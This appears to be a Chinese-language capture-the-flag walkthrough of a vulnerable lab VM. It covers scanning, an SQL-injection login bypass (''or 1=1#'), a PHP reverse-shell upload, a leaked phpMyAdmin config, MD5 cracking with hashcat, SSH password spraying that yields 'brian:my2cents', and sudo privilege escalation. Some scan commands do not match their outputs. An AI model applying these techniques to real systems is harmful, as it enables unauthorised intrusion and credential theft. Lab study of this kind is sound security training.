### 信息收集
#### 主机发现
```
sudo arp-scan -l
```
#### 端口扫描
```
TCP
sudo nmap --min-rate 10000 192.168.1.136 -oA nmapscan/ports/ctf7

# Nmap 7.94SVN scan initiated Tue Mar 19 19:30:29 2024 as: nmap --min-rate 10000 -oA nmapscan/ports/CTF7 192.168.1.136
Nmap scan report for 192.168.1.136
Host is up (0.00092s latency).
Not shown: 987 filtered tcp ports (no-response), 6 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
139/tcp   open   netbios-ssn
901/tcp   open   samba-swat
5900/tcp  closed vnc
8080/tcp  open   http-proxy
10000/tcp open   snet-sensor-mgmt
MAC Address: 00:0C:29:9D:12:A9 (VMware)

# Nmap done at Tue Mar 19 19:30:30 2024 -- 1 IP address (1 host up) scanned in 0.62 seconds


UDP

# Nmap 7.94SVN scan initiated Tue Mar 19 20:28:50 2024 as: nmap -sU --top-port 20 -oA nmapscan/udp/ctf7 192.168.1.136
Nmap scan report for 192.168.1.136
Host is up (0.0010s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    filtered      dhcps
68/udp    filtered      dhcpc
69/udp    open|filtered tftp
123/udp   filtered      ntp
135/udp   filtered      msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   filtered      netbios-ssn
161/udp   open|filtered snmp
162/udp   filtered      snmptrap
445/udp   filtered      microsoft-ds
500/udp   open|filtered isakmp
514/udp   filtered      syslog
520/udp   open|filtered route
631/udp   filtered      ipp
1434/udp  open|filtered ms-sql-m
1900/udp  filtered      upnp
4500/udp  filtered      nat-t-ike
49152/udp filtered      unknown
MAC Address: 00:0C:29:9D:12:A9 (VMware)

# Nmap done at Tue Mar 19 20:29:11 2024 -- 1 IP address (1 host up) scanned in 20.50 seconds

```

#### 详细信息扫描
```
sudo nmap -sT -sV -sC -O -p22,80,139,901,8080,10000 192.168.1.136 -oA nmapscan/details/ctf7

 Nmap 7.94SVN scan initiated Tue Mar 19 20:27:40 2024 as: nmap -sT -sC -sV -O -p21,22,80,111,445,2049,2121 -oA nmapscan/detail/ctf7 192.168.1.136
Nmap scan report for 192.168.1.136
Host is up (0.0014s latency).

PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   open     ssh          OpenSSH 5.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 41:8a:0d:5d:59:60:45:c4:c4:15:f3:8a:8d:c0:99:19 (DSA)
|_  2048 66:fb:a3:b4:74:72:66:f4:92:73:8f:bf:61:ec:8b:35 (RSA)
80/tcp   open     http         Apache httpd 2.2.15 ((CentOS))
|_http-server-header: Apache/2.2.15 (CentOS)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Mad Irish Hacking Academy
111/tcp  filtered rpcbind
445/tcp  filtered microsoft-ds
2049/tcp filtered nfs
2121/tcp filtered ccproxy-ftp
MAC Address: 00:0C:29:9D:12:A9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|media device|webcam
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (97%), Drobo embedded (89%), Synology DiskStation Manager 5.X (89%), LG embedded (88%), Tandberg embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/h:drobo:5n cpe:/a:synology:diskstation_manager:5.2
Aggressive OS guesses: Linux 2.6.32 - 3.10 (97%), Linux 2.6.32 - 3.13 (97%), Linux 2.6.39 (94%), Linux 2.6.32 - 3.5 (92%), Linux 3.2 (91%), Linux 3.2 - 3.16 (91%), Linux 3.2 - 3.8 (91%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 19 20:28:03 2024 -- 1 IP address (1 host up) scanned in 23.34 seconds
```

#### 默认脚本漏洞扫描
```
sudo nmap --script=vuln -p22,80,139,901,8080,10000 -oA nmapscan/vuln/ctf7

# Nmap 7.94SVN scan initiated Tue Mar 19 20:30:26 2024 as: nmap --script=vuln -p21,22,80,111,445,2049,2121 -oA nmapscan/vuln/ctf7 192.168.1.136
Nmap scan report for 192.168.1.136
Host is up (0.00070s latency).

PORT     STATE    SERVICE
21/tcp   filtered ftp
22/tcp   open     ssh
80/tcp   open     http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-trace: TRACE is enabled
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /webmail/: Mail folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /icons/: Potentially interesting folder w/ directory listing
|   /img/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /inc/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|_  /webalizer/: Potentially interesting folder
111/tcp  filtered rpcbind
445/tcp  filtered microsoft-ds
2049/tcp filtered nfs
2121/tcp filtered ccproxy-ftp
MAC Address: 00:0C:29:9D:12:A9 (VMware)

# Nmap done at Tue Mar 19 20:32:05 2024 -- 1 IP address (1 host up) scanned in 99.66 seconds
```

### web渗透
#### 目录扫描
```
第一次扫描
sudo gobuster dir -u http://192.168.1.13 --wordlist=/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -o /home/pduck/Redteam/Connect-The-Dots/dir/a


/contact              (Status: 200) [Size: 5017]
/about                (Status: 200) [Size: 4910]
/img                  (Status: 301) [Size: 312] [--> http://192.168.1.136/img/]
/default              (Status: 200) [Size: 6058]
/register             (Status: 200) [Size: 6591]
/profile              (Status: 200) [Size: 3977]
/newsletter           (Status: 200) [Size: 4037]
/header               (Status: 200) [Size: 3904]
/signup               (Status: 200) [Size: 4783]
/assets               (Status: 301) [Size: 315] [--> http://192.168.1.136/assets/]
/footer               (Status: 200) [Size: 3904]
/css                  (Status: 301) [Size: 312] [--> http://192.168.1.136/css/]
/read                 (Status: 302) [Size: 1] [--> /readings]
/db                   (Status: 200) [Size: 3904]
/js                   (Status: 301) [Size: 311] [--> http://192.168.1.136/js/]
/usage                (Status: 403) [Size: 286]
/webmail              (Status: 301) [Size: 316] [--> http://192.168.1.136/webmail/]
/inc                  (Status: 301) [Size: 312] [--> http://192.168.1.136/inc/]
/recovery             (Status: 200) [Size: 4807]
/backups              (Status: 301) [Size: 331] [--> http://192.168.1.136/backups/?action=backups]
/webalizer            (Status: 301) [Size: 318] [--> http://192.168.1.136/webalizer/]
/readingroom          (Status: 200) [Size: 4037]
/trainings            (Status: 200) [Size: 4218]
/phpinfo              (Status: 200) [Size: 58663]


sudo gobuster dir -u http://192.168.1.136 -x html,txt,rar,zip,sql,php --wordlist=/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -o /home/pduck/Redteam/Connect-The-Dots/dir/b

没有变化
```
#### 信息收集
```
根据主页显示的信息得知，这是一个网络安全的培训课程，源码没有发现什么
assets和img下显示的有图片，有邮箱登录，sql万能密码输入格式不对，后面再考虑爆破
```
#### sql注入
```
访问8080端口，发现账户密码登录
尝试万能密码
user:'or 1=1# 成功登录

在# Readings界面发现可以文件上传
构造php反弹shell
在assest界面发现上传的文件，监听并运行
```

### 提权
#### 横向移动
```
/var/www/admin/phpmyadmin/config 下的config.inc.php文件发现

<?php
/*
 * Generated configuration file
 * Generated by: phpMyAdmin 3.5.4 setup script
 * Date: Wed, 19 Dec 2012 09:01:38 -0500
 */

/* Servers configuration */
$i = 0;

/* Server: localhost [1] */
$i++;
$cfg['Servers'][$i]['verbose'] = 'localhost';
$cfg['Servers'][$i]['host'] = 'localhost';
$cfg['Servers'][$i]['port'] = '';
$cfg['Servers'][$i]['socket'] = '';
$cfg['Servers'][$i]['connect_type'] = 'tcp';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['nopassword'] = true;
$cfg['Servers'][$i]['auth_type'] = 'cookie';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = '';
$cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
$cfg['Servers'][$i]['AllowNoPasswordRoot'] = TRUE; 

/* End of servers configuration */

$cfg['blowfish_secret'] = '50d1c8ba084fd9.39888691';
$cfg['DefaultLang'] = 'en';
$cfg['ServerDefault'] = 1;
$cfg['UploadDir'] = '';
$cfg['SaveDir'] = '';

发现mysql登录用户root不需要输入密码

登录mysql，获取user表信息
得到用户和hash
```

#### 密码喷射
```
将密码存储到sqlpass.hash文件
cat sqlpass.hash | awk -F '|' '{print $2}' 分别将用户和密码存储到文件

hash-identifier 判断为md5

hashcat -a 0 -m 0 password.hash /usr/share/wordlists/rocky.txt -o pass.txt
-a 指定密码破解模式  指定密码文件
-m 0 指定破解密码类型为md5

sudo crackmapexec ssh 192.168.1.136 - p pass.txt -u user.txt --continue-on-success

brian:my2cents成功

```
#### 垂直提权
```
ssh brian@192.168.1.136 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa

登录，
sudo -l 发现拥有所有权限
sudo su 提权成功
```